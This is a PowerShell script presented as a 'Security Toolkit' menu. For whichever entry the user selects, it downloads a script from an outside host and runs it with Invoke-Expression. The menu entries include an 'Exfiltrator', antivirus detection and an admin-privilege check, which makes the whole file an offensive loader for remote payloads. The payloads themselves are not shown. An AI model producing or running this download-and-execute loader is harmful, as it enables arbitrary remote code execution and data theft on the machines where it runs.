# Define the tool URLs in a hashtable for better management
$tools = @{
    "What is my IP?" = "http://bryan.tool/Whatismtip"
    "Am I admin?"    = "http://bryan.tools/amiadmin"
    "AV Detect"      = "http://bryan.tools/detect"
    "Exfiltrator"    = "http://bryan.tools/exfil"
    "Reporter"       = "http://bryan.tools/report"
}

function Show-Menu {
    Clear-Host
    Write-Host "Security Toolkit v1.0`n" -ForegroundColor Cyan
    Write-Host "Select a tool to run:`n" -ForegroundColor Yellow

    $menuIndex = 1
    $tools.Keys | ForEach-Object {
        Write-Host "[$menuIndex] $_" -ForegroundColor Green
        $menuIndex++
    }
    Write-Host "`n[0] Exit`n" -ForegroundColor Red
}

function Invoke-SelectedTool {
    param (
        [string]$Url
    )
    try {
        Write-Host "`nExecuting script from $Url..." -ForegroundColor Yellow
        $result = Invoke-RestMethod -Uri $Url -UseBasicParsing
        if ($result) {
            Invoke-Expression $result
        }
    }
    catch {
        Write-Host "Error executing script: $_" -ForegroundColor Red
    }
    Write-Host "`nPress any key to continue..."
    $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
}

# Main menu loop
while ($true) {
    Show-Menu
    $choice = Read-Host "Enter your choice"
    
    if ($choice -eq '0') {
        Write-Host "Goodbye!" -ForegroundColor Cyan
        break
    }
    
    $toolIndex = [int]$choice - 1
    if ($toolIndex -ge 0 -and $toolIndex -lt $tools.Count) {
        $selectedTool = ($tools.Keys | Select-Object -Index $toolIndex)
        $selectedUrl = $tools[$selectedTool]
        Invoke-SelectedTool -Url $selectedUrl
    }
    else {
        Write-Host "Invalid selection. Press any key to continue..."
        $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
    }
}
